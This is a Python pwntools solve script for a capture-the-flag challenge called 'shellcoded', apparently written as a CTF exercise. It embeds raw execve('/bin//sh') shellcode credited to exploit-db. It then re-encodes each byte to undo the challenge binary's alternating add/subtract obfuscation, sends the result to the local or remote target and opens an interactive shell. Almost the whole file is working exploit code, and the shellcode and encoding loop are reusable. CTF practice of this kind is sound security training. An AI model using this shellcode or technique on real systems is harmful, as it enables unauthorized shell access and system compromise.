#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import time
import binascii

context.update(arch='amd64')
exe = './shellcoded'
HOST = 'challenge.ctf.games'
PORT = 32383

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

# $ python3 solve.py DEBUG GDB NOASLR
gdbscript = '''
b main
c
b *0x0000555555555483
c
x/32x 0x55555555a000
'''.format(**locals())

p = start()
p.recvline()

# https://www.exploit-db.com/exploits/42179
shell = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

payload = b""
mul = 0

log.info("reversing obfuscation")
for idx, char in enumerate(shell):
    # reverse of addition operations in binary
    if idx & 1 == 0:
        mul = -1
    else:
        mul = 1

    try:
        payload += (char+(idx*mul)).to_bytes(1, 'little')
    except OverflowError:
        payload += b"\xf9" # account for underflow of \x0f byte

log.info("sending payload...")
p.sendline(payload)
p.interactive()

